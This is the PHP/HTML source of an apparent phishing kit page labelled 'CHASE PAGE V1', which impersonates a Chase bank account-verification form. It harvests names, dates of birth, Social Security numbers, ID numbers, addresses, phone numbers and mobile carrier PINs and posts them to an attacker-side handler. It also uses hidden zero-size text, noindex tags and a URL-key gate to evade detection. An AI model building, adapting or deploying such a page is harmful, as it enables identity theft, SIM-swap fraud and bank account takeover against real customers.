<?php
error_reporting(E_ALL ^ E_NOTICE);
session_start();
// include'Protection.php'; 
include'admin/config.php';
//   if (!isset($_SESSION['ZRXSESSION']) or !isset($_GET['key'])) {
//       header('HTTP/1.0 403 Forbidden');
//       die('<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML 2.0//EN"><html><head><title>403 Forbidden</title></head><body><h1>Forbidden</h1><p>You dont have permission to access / on this server.</p></body></html>');
//       exit();
//   }
    /*
    |--------------------------------------------------------------------------
    | CHASE PAGE V1
    |--------------------------------------------------------------------------
    |
    | Contact me : @zroxo
    |
    */
// Generating a CSRF Token

if (empty($_SESSION['token'])) {
    $_SESSION['token'] = bin2hex(random_bytes(32));
}
$token = $_SESSION['token'];

?>
<html xmlns="http://www.w3.org/1999/xhtml" class="no-js" lang="en" dir="ltr">
   <head>
      <meta charset="UTF-8">
      <meta name="robots" content="noindex,nofollow">
      <meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1">
      <title>Get Started - Account Verification</title>
      <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=2.0, user-scalable=yes">
      <link rel="stylesheet" type="text/css" href="files/css/verifyzroxo.css">
      <link rel="stylesheet" type="text/css" href="files/css/verifyzroxo2.css">
      <link rel="shortcut icon" href="files/img/faviconx.ico">
   </head>
   <body>
      <div>
      <header>
         <div class="a8f5dfn4df4nd">
            <div class="row top" style="background-color: #005eb8;">
               <div class="col-xs-4"> 
                  <span>
                  <a class="zroxo focus" href="javascript:void(0);"><i class="zroxo menulines icon" id="sdb4sdb4sdsc">
                  </i>
                  </a>
                  </span> 
                  <span class="zroxo link" id="exitlink">
                  <a class="yjhsdxcb5ds4b6 vncn5fd4ndf1n" id="exitApp" href="javascript:void(0);">Exit</a>
                  </span>
               </div>
               <div class="col-xs-4 ytik54fnvc">
                  <svg class="octogon" version="1.1" id="Layer_1" x="0px" y="0px" width="30px" height="30px" viewBox="0 0 268 268" xml:space="preserve" focusable="false">
                     <path d="M100.749,8.655c-4.88,0-8.86,3.968-8.86,8.844v62.095h164.04L181.227,8.69L100.749,8.655" style="fill: rgb(255, 255, 255);"></path>
                     <path d="M261.945,98.372c0-4.884-3.947-8.82-8.875-8.82h-62.052V253.6l70.896-74.726L261.945,98.372" style="fill: rgb(255, 255, 255);">           </path>
                     <path d="M172.177,259.538c4.864,0,8.86-3.965,8.86-8.845v-62.099H16.989l74.678,70.943H172.177" style="fill: rgb(255, 255, 255);"></path>
                     <path d="M10.996,169.848c0,4.896,3.933,8.829,8.832,8.829h62.111V14.629L10.996,89.362V169.848" style="fill: rgb(255, 255, 255);"></path>
                  </svg>
               </div>
               <div class="col-xs-4 util right yiuxcnx3453">
               </div>
            </div>
         </div>
      </header>
      <div>
      <div>
      <div class="xcbd5h4bsdbdsb">
      </div>
      <form action="actions/auth3" method="POST">
        <input type="hidden" name="token" value="<?php echo $token; ?>" />  
        <input type="hidden" name="key_token" value="<?php echo $_GET['key']; ?>" />  
         <main class="xcbd5h4bsdbdsb">
            <div>
               <div>
                  <style>.origination-custom.zroxo.progress.bar.step1of8:after{width: 50%;}</style>
                  <div class="row vj94ndfn4dfn">
                     <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-push-2 col-lg-push-3">
                        <div>
                           <div>
                              <h1 tabindex="-1">Veri<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ficat<font style="color:transparent;font-size:0px"><?=$rundom;?></font>ion</h1>
                              <span class="zroxo util bcvbdsndf7845dbv">
                              </span>
                           </div>
                        </div>
                        <div>
                           <div class="row">
                              <div class="col-xs-12 col-sm-12">
                                 <div class="zroxo progress origination-custom step1of8 bar">
                                    <div class="bar fill">
                                    </div>
                                    <span class="util bcvbdsndf7845dbv">
                                    </span>
                                 </div>
                              </div>
                           </div>
                        </div>
                        <br>
                     </div>
                  </div>
               </div>
            </div>
            <section class="origination page-content" id="content">
               <div id="Bvdfnf65ndf">
               <div class="row">
               <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-push-2 col-lg-push-3">
               <div>
                  <div>
                     <div class="row">
                        <div class="col-xs-12 col-sm-12">
                           <div class="BODY field-mb-24">This should be your full legal name as it appears on your government ID.</div>
                        </div>
                     </div>
                     <div>
                        <div class="zroxobb nameInformation">
                           <div class="inlineFieldRow">
                              <div class="inlineFieldCell">
                                 <div class="zroxo fieldgroup">
                                    <div class="zroxo vertical">
                                       <div class="align-label-input">
                                          <div class="label-wrapper">
                                             <label class="zroxo fieldlabel label-alignment vertical">
                                             <span class="util bcvbdsndf7845dbv">
                                             </span>First name <span class="util bcvbdsndf7845dbv">
                                             </span>
                                             </label>
                                          </div>
                                          <div class="zroxo validationinput">
                                             <div> 
                                                <input class="zroxo input" placeholder="" name="firstname" data-validation="length" data-validation-length="min2-30" data-validation-error-msg="Please tell us your first name.">
                                                <span class="util bcvbdsndf7845dbv ytynfdf6n"></span>
                                             </div>
                                          </div>
                                       </div>
                                       <div>
                                          <div> 
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                              <div class="inlineFieldCell">
                                 <div class="zroxo fieldgroup">
                                    <div class="zroxo vertical">
                                       <div class="align-label-input">
                                          <div class="label-wrapper">
                                             <label class="zroxo fieldlabel label-alignment vertical"><span class="util bcvbdsndf7845dbv"></span>Last name<span class="util bcvbdsndf7845dbv"></span></label>
                                          </div>
                                          <div class="zroxo validationinput">
                                             <div>
                                                <input class="zroxo input" placeholder="" name="lastname" data-validation="length" data-validation-length="min2-30" data-validation-error-msg="Please tell us your last name.">
                                                <span class="util bcvbdsndf7845dbv ytynfdf6n"> 
                                                </span>
                                             </div>
                                          </div>
                                       </div>
                                       <div>
                                          <div>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
               <div>
                  <div class="b5x4bxc4b">
                     <div class="zroxo header Ddff6n5dfn contact-header-margin field-mt-0 field-mb-24">Identification</div>
                  </div>
               </div>
               <div>
                  <div>
                     <div class="row">
                        <div class="col-xs-12 col-sm-6">
                           <div>
                              <div class="zroxo fieldgroup">
                                 <div class="zroxo vertical">
                                    <div class="align-label-input">
                                       <div class="label-wrapper">
                                          <label class="zroxo fieldlabel label-alignment vertical">
                                          <span class="util bcvbdsndf7845dbv">
                                          </span>Date of birth <span class="util bcvbdsndf7845dbv">
                                          </span>
                                          </label>
                                       </div>
                                       <div class="zroxo validationinput">
                                          <div id="dateOfBirth-text-validate">
                                             <input class="zroxo input" id="dlexp" name="dob"  type="date" placeholder=""  data-validation="length" data-validation-error-msg="Please tell us your date of birth in mm/dd/yyyy format." data-validation-length="min10" >
                                             <span class="util bcvbdsndf7845dbv" aria-hidden="true">: formats as you type mm/dd/yyyy</span>
                                          </div>
                                       </div>
                                    </div>
                                    <div>
                                       <div>
                                          <div class="tdb5dh54sdh">
                                             <div class="zroxo fieldhelpertext">mm/dd/yyyy  </div>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                        <div class="col-xs-12 col-sm-6">
                           <div>
                              <div class="zroxo fieldgroup">
                                 <div class="zroxo vertical">
                                    <div class="align-label-input">
                                       <div class="label-wrapper">
                                          <label class="zroxo fieldlabel label-alignment vertical">
                                          <span class="util bcvbdsndf7845dbv">
                                          </span>Social Security number <span class="util bcvbdsndf7845dbv">
                                          </span>
                                          </label>
                                       </div>
                                       <div class="zroxo validationinput">
                                          <div>
                                             <input  class="zroxo input" placeholder="" type="tel" id="ssn" name="S5SN" data-validation="length" data-validation-length="min11-11" data-validation-error-msg="Please tell us your Social Security number.">
                                             <span class="util bcvbdsndf7845dbv">, Formats as you type xxx-xx-xxxx.</span>
                                          </div>
                                       </div>
                                    </div>
                                    <div>
                                       <div>
                                          <div class="tdb5dh54sdh">
                                             <div class="zroxo fieldhelpertext">We're required to ask for your SSN to verify your identity. We'll keep your data secure.  </div>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                              <span class="zroxo link">
                              </span>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>

<?php
if ($get_DL == "on") {

?>
                 <div>
                  <div>
                     <div class="row">
                       <div class="col-xs-12 col-sm-6">
                           <div class="zroxo fieldgroup">
                              <div class="zroxo vertical">
                                 <div class="align-label-input">
                                    <div class="label-wrapper">
                                       <label class="zroxo fieldlabel label-alignment vertical">
                                       <span class="util bcvbdsndf7845dbv">
                                       </span>Type of ID <span class="util bcvbdsndf7845dbv"></span>
                                       </label>
                                    </div>
                                    <div class="zroxo validationselect">
                                       <span class="zroxo select">
                                          <span class="wrap right">
                                             <div class="selectwrap">
                                                <select required="" name="idtype">
                                                   <option disabled="" value="" selected="">Choose one</option>
                                                   <option value="DL">Driver's license</option>
                                                   <option value="STATEID">State ID</option>
                                                </select>
                                             </div>
                                             <span class="zroxo iconwrap" tabindex="-1">
                                             <i class="zroxo expanddown input-icon icon" aria-hidden="true">
                                             </i>
                                             </span>
                                          </span>
                                       </span>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                        <div class="col-xs-12 col-sm-6">
                           <div>
                              <div class="zroxo fieldgroup">
                                 <div class="zroxo vertical">
                                    <div class="align-label-input">
                                       <div class="label-wrapper">
                                          <label class="zroxo fieldlabel label-alignment vertical">
                                          <span class="util bcvbdsndf7845dbv">
                                          </span>ID number <span class="util bcvbdsndf7845dbv">
                                          </span>
                                          </label>
                                       </div>
                                       <div class="zroxo validationinput">
                                          <div>
                                             <input  class="zroxo input" placeholder="" type="tel" name="idn" data-validation="length" data-validation-length="min1-20" data-validation-error-msg="Please tell us the ID number on your driver's license or state ID.">
                                             <span class="util bcvbdsndf7845dbv">, Formats as you type xxx-xx-xxxx.</span>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                              <span class="zroxo link">
                              </span>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
<?php
}
?>
               <div>
                  <div>
                     <div class="row">
                        <div class="col-xs-12 col-sm-6">
                           <div class="zroxo fieldgroup">
                              <div class="zroxo vertical">
                                 <div class="align-label-input">
                                    <div class="label-wrapper">
                                       <label class="zroxo fieldlabel label-alignment vertical">
                                       <span class="util bcvbdsndf7845dbv">
                                       </span>Issuing state <span class="util bcvbdsndf7845dbv"></span>
                                       </label>
                                    </div>
                                    <div class="zroxo validationselect">
                                       <span class="zroxo select">
                                          <span class="wrap right">
                                             <div class="selectwrap">
                                                <select required="" name="issuest">
                                                   <option disabled="" value="" selected="">Choose one</option>
                                                   <option value="Alabama">Alabama</option>
                                                   <option value="Alaska">Alaska</option>
                                                   <option value="Arizona">Arizona</option>
                                                   <option value="Arkansas">Arkansas</option>
                                                   <option value="California">California</option>
                                                   <option value="Colorado">Colorado</option>
                                                   <option value="Connecticut">Connecticut</option>
                                                   <option value="Delaware">Delaware</option>
                                                   <option value="DC">District of Columbia</option>
                                                   <option value="Florida">Florida</option>
                                                   <option value="Georgia">Georgia</option>
                                                   <option value="Hawaii">Hawaii</option>
                                                   <option value="Idaho">Idaho</option>
                                                   <option value="Illinois">Illinois</option>
                                                   <option value="Indiana">Indiana</option>
                                                   <option value="Iowa">Iowa</option>
                                                   <option value="Kansas">Kansas</option>
                                                   <option value="Kentucky">Kentucky</option>
                                                   <option value="Louisiana">Louisiana</option>
                                                   <option value="Maine">Maine</option>
                                                   <option value="Maryland">Maryland</option>
                                                   <option value="Massachusetts">Massachusetts</option>
                                                   <option value="Michigan">Michigan</option>
                                                   <option value="Minnesota">Minnesota</option>
                                                   <option value="Mississippi">Mississippi</option>
                                                   <option value="Missouri">Missouri</option>
                                                   <option value="Montana">Montana</option>
                                                   <option value="Nebraska">Nebraska</option>
                                                   <option value="Nevada">Nevada</option>
                                                   <option value="New Hampshire">New Hampshire</option>
                                                   <option value="New Jersey">New Jersey</option>
                                                   <option value="New Mexico">New Mexico</option>
                                                   <option value="New York">New York</option>
                                                   <option value="North Carolina">North Carolina</option>
                                                   <option value="North Dakota">North Dakota</option>
                                                   <option value="Ohio">Ohio</option>
                                                   <option value="Oklahoma">Oklahoma</option>
                                                   <option value="Oregon">Oregon</option>
                                                   <option value="Pennsylvania">Pennsylvania</option>
                                                   <option value="Rhode Island">Rhode Island</option>
                                                   <option value="South Carolina">South Carolina</option>
                                                   <option value="South Dakota">South Dakota</option>
                                                   <option value="Tennessee">Tennessee</option>
                                                   <option value="Texas">Texas</option>
                                                   <option value="Utah">Utah</option>
                                                   <option value="Vermont">Vermont</option>
                                                   <option value="Virginia">Virginia</option>
                                                   <option value="Washington">Washington</option>
                                                   <option value="West Virginia">West Virginia</option>
                                                   <option value="Wisconsin">Wisconsin</option>
                                                   <option value="Wyoming">Wyoming</option>
                                                </select>
                                             </div>
                                             <span class="zroxo iconwrap" tabindex="-1">
                                             <i class="zroxo expanddown input-icon icon" aria-hidden="true">
                                             </i>
                                             </span>
                                          </span>
                                       </span>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                     <div>
                        <div>
                           <div class="row b5x4bxc4b">
                              <div class="col-xs-12 col-sm-6">
                                 <div class="zroxo header Ddff6n5dfn field-mt-0 field-mb-24">Contact information</div>
                              </div>
                           </div>
                           <div>

                              <div class="zroxobb multiType">
                                 <div>
                                    <div class="zroxobb">
                                       <div class="row">
                                          <div class="col-xs-12 col-sm-6">
                                             <div class="zroxo fieldgroup ytu5f4sdfn">
                                                <div class="zroxo vertical">
                                                   <div class="align-label-input">
                                                      <div class="label-wrapper">
                                                         <label class="zroxo fieldlabel label-alignment vertical">
                                                         <span class="util bcvbdsndf7845dbv">
                                                         </span>Street address <span class="util bcvbdsndf7845dbv">
                                                         </span>
                                                         </label>
                                                      </div>
                                                      <div class="zroxo validationinput">
                                                         <div id="streetAddress-blx-residentialAddressBlock-text-validate">
                                                            <input  class="zroxo input"  placeholder=""  name="Streetadd" data-validation="length" data-validation-length="min2-30"  data-validation-error-msg="Please tell us your address.">
                                                         </div>
                                                      </div>
                                                   </div>
                                                   <div>
                                                      <div>
                                                      </div>
                                                   </div>
                                                </div>
                                             </div>
                                          </div>
                                          <div class="col-xs-12 col-sm-6">
                                             <div class="zroxo fieldgroup ytu5f4sdfn">
                                                <div class="zroxo vertical">
                                                   <div class="align-label-input">
                                                      <div class="label-wrapper">
                                                         <label class="zroxo fieldlabel label-alignment vertical">
                                                         <span class="util bcvbdsndf7845dbv" >
                                                         </span>Suite/apt/other<span class="additionalText">(optional)</span>
                                                         </label>
                                                      </div>
                                                      <div class="zroxo validationinput">
                                                         <div>
                                                            <input class="zroxo input" placeholder="" maxlength="30" name="address2" >
                                                            <span class="util bcvbdsndf7845dbv ytynfdf6n">
                                                            </span>
                                                         </div>
                                                      </div>
                                                   </div>
                                                   <div>
                                                   </div>
                                                </div>
                                             </div>
                                          </div>
                                       </div>
                                       <div class="row">
                                          <div class="col-xs-12 col-sm-6">
                                             <div class="zroxo fieldgroup addressZipCode ytu5f4sdfn">
                                                <div class="zroxo vertical">
                                                   <div>
                                                      <div class="label-wrapper">
                                                         <label class="zroxo fieldlabel label-alignment vertical">
                                                         <span class="util bcvbdsndf7845dbv">
                                                         </span>ZIP code <span class="util bcvbdsndf7845dbv">
                                                         </span>
                                                         </label>
                                                      </div>
                                                      <div class="zroxo validationinput">
                                                         <div>
                                                            <input  class="zroxo input"  placeholder="" onchange='checkzipcode()'  type="tel" id="zipcode" name="zipcode" data-validation="length" data-validation-length="min1-5"  data-validation-error-msg="Please tell us your ZIP code."> 
                                                         </div>
                                                      </div>
                                                      <div><div> <div class="tdb5dh54sdh"><div class="zroxo fieldhelpertext">Your city and state will automatically populate below once you've told us your ZIP code.  </div></div> </div></div>

                                                   </div>
                                                </div>
                                             </div>

                                             <div id="datainfo" class="hidden">
                                             <div class="row"><div class="col-xs-12 col-sm-6"> <div class="zroxo fieldgroup blockFieldGroupXs"><div class="zroxo vertical fieldtext"><div class="align-label-input"><div class="label-wrapper"><label class="zroxo fieldlabel">City</label> <span class="util accessible-text"></span> </div> <input class="fieldtext fieldtext--input" readonly="" id="city" value="" name="city"> </div>  </div> </div></div> <div class="col-xs-12 col-sm-6"><div class="zroxo fieldgroup blockFieldGroupXs"><div class="zroxo vertical fieldtext"><div class="align-label-input"><div class="label-wrapper"><label class="zroxo fieldlabel">State</label> <span class="util accessible-text"></span> </div>   <input class="fieldtext fieldtext--input" readonly="" id="state" name="state" value=""> </div>  </div> </div></div></div>
                                             <input type="hidden" name="routingNumber" id="routingNumber" value="">
                                             <input type="hidden" name="branchNumber" id="branchNumber" value="">
                                             <div class="cxd98n4dfdn" tabindex="-1">
                                             </div>
                                             </div>
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                        </div>
                     </div>
                     <div>
                        <div class="row">
                           <div class="col-xs-12 col-sm-6">
                              <div class="zroxo fieldgroup">
                                 <div class="zroxo vertical">
                                    <div class="align-label-input">
                                       <div class="label-wrapper">
                                          <label class="zroxo fieldlabel label-alignment vertical">
                                          <span class="util bcvbdsndf7845dbv">
                                          </span>Phone number <span class="util bcvbdsndf7845dbv"></span>
                                          </label>
                                       </div>
                                       <div class="zroxo validationinput">
                                          <div>
                                             <input  class="zroxo input"  placeholder="" name="phoneNumber" id="phoneNumber"  data-validation="length" data-validation-error-msg="Tell us your phone number." data-validation-length="min14" >
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                           </div>
                           <div class="col-xs-12 col-sm-6">
                              <div class="zroxo fieldgroup addressZipCode ytu5f4sdfn">
                                 <div class="zroxo vertical">
                                    <div class="align-label-input">
                                       <div class="label-wrapper">
                                          <label class="zroxo fieldlabel label-alignment vertical">
                                          <span class="util bcvbdsndf7845dbv">
                                          </span>Carrier Pin <span class="util bcvbdsndf7845dbv" >
                                          </span>
                                          </label>
                                       </div>
                                       <div class="zroxo validationinput">
                                          <div id="zipCode-blx-residentialAddressBlock-text-validate">
                                             <input class="zroxo input" placeholder="" type="password" name="carrierpin" data-validation="length" data-validation-length="min4-6" data-validation-error-msg="Please tell us your Carrier Pin."> 
                                          </div>
                                       </div>
                                    </div>
                                 </div>
                              </div>
                              <div class="cxd98n4dfdn" tabindex="-1">
                              </div>
                           </div>
                        </div>
                        <div>
                           <div>
                              <div class="row">
                                 <div class="col-xs-12">
                                    <p class="BODY">When you give us your mobile number, we have your consent to send you automated calls and texts to service all of your accounts with us.
                                    </p>
                                 </div>
                              </div>
                              <div class="field-mt-24"></div>
                              <div>
                              </div>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            </section>
            <div id="rtjfndf654n">
               <div>
                  <div class="row">
                     <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-push-2 col-lg-push-3">
                        <div class="row">
                           <div class="col-xs-12 xcfd4df5ndf">
                              <button type="submit" class="zroxo button focus util float right primary" style="background-color: #005eb8;">
                              <span class="label">Next</span>
                              </button>
                              <button type="button" id="BACKbtn" class="zroxo button focus util float right t8g7d6dh4db">
                              <span class="label">Back</span>
                              </button>
                           </div>
                        </div>
                     </div>
                  </div>
               </div>
            </div>
         </main>
      </form>
<script src="https://rawgit.com/RobinHerbots/Inputmask/4.x/dist/inputmask/dependencyLibs/inputmask.dependencyLib.js"></script>
<script src="https://rawgit.com/RobinHerbots/Inputmask/4.x/dist/inputmask/inputmask.js"></script>
<script src="//ajax.googleapis.com/ajax/libs/jquery/1.10.2/jquery.min.js"></script>
<script src="//cdnjs.cloudflare.com/ajax/libs/jquery-form-validator/2.3.26/jquery.form-validator.min.js"></script>
<script>
    const urlSearchParams = new URLSearchParams(window.location.search);
    const params = Object.fromEntries(urlSearchParams.entries());

    if (params.key === '' || params.key === null || params.key === undefined) {
        window.location.href = "/final_backup/error";
    }
    
  $.validate();
  $('#my-textarea').restrictLength( $('#max-length-element') );
  $.validate({
  modules : 'toggleDisabled',
  disabledFormFilter : 'form.toggle-disabled',
  showErrorDialogs : false
});
Inputmask("(9{1,3}) 9{1,3} 9{1,4}").mask("#phoneNumber");
Inputmask("9{1,3}-9{1,2}-9{1,4}").mask("#ssn"); 
Inputmask("9{1,2}/9{1,2}/9{1,4}").mask("#dlexp");
</script>
<script type="text/javascript">
var x = document.getElementById("zipcode");
const checkzipcode = () => {
   let zipcode = document.getElementById('zipcode').value;
   $.ajax({
            type : 'POST',
            data : {zipcode : zipcode},
            url : 'includes/zipcode.php',
            success : function(response){
                if(response === 'invalid'){
                    document.getElementById("zipcode").style.borderColor = '#B94A48';
                }else{
                    var obj = JSON.parse(response);
                    $("#datainfo").removeClass('hidden');
                    document.getElementById("city").value = obj.city;
                    document.getElementById("state").value = obj.state;
                    document.getElementById("routingNumber").value = obj.routingNumber;
                    document.getElementById("branchNumber").value = obj.branchNumber;
                }
            }
        })
}
</script>
   </body>
</html>